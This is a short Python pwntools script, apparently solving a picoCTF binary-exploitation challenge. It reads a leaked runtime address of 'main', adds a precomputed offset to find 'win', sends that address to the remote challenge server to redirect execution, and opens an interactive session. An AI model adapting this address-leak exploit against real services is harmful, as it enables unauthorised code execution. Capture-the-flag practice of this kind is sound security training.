from pwn import *

# Load the binary and compute offset (for local offset calculation)
elf = context.binary = ELF('./vuln')
offset = elf.sym['win'] - elf.sym['main']

# Connect to the remote server
HOST = 'rescued-float.picoctf.net'  # Replace with server IP/hostname
PORT = 56913                    #Replace with server port
p = remote(HOST, PORT)

# Extract main's runtime address
p.recvuntil(b'Enter your name: ')
main_addr = int(p.recvline().strip(), 16)

# Calculate win's address
win_addr = main_addr + offset

# Send the address and trigger win()
p.sendlineafter(b'0x12345: ', hex(win_addr).encode())
p.interactive()
